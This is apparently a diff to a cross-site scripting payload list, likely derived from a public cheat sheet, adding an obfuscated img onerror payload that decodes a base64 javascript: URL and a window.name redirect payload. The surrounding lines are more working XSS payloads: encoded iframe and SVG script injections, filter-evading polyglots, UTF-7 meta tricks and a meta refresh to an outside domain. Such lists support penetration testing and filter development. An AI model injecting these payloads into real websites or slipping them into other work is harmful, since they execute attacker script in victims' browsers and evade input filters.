@@ -1424,6 +1424,7 @@ code
 <iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;><\/iframe>
 <iframe src=\"javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'\"><\/iframe>
 <svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)<\/script><\/svg>
+<img src=x onerror=location=atob`amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5kb21haW4p`>
 javascript:\/*--><\/title><\/style><\/textarea><\/script><\/xmp><svg\/onload='+\/\"\/+\/onmouseover=1\/+\/[*\/[]\/+alert(1)\/\/'>
 javascript:\"\/*'\/*`\/*--><\/noscript><\/title><\/textarea><\/style><\/template><\/noembed><\/script><html \\\"\n onmouseover=\/*&lt;svg\/*\/onload=alert()\/\/>
 javascript:/*--><\/title><\/style><\/textarea><\/script><\/xmp><details\/open\/ontoggle='+\/`\/+\/\"\/+\/onmouseover=1\/+\/[*\/[]\/+alert(\/@PortSwiggerRes\/)\/\/'>
@@ -1467,6 +1468,7 @@ javascript:/*--><\/title><\/style><\/textarea><\/script><\/xmp><details\/open\/o
 <script>throw[onerror]=[alert],1<\/script>
 <script>var{a:onerror}={a:alert};throw 1<\/script>
 <script>var{haha:onerror=alert}=0;throw 1<\/script>
+<script>window.name='javascript:alert(1)';<\/script><svg onload=location=name>
 <meta http-equiv=\"refresh\" content=\"0; url=\/\/portswigger-labs.net\">
 <meta charset=\"UTF-7\" \/> +ADw-script+AD4-alert(1)+ADw-\/script+AD4-
 <meta http-equiv=\"Content-Type\" content=\"text\/html; charset=UTF-7\" \/> +ADw-script+AD4-alert(1)+ADw-\/script+AD4-
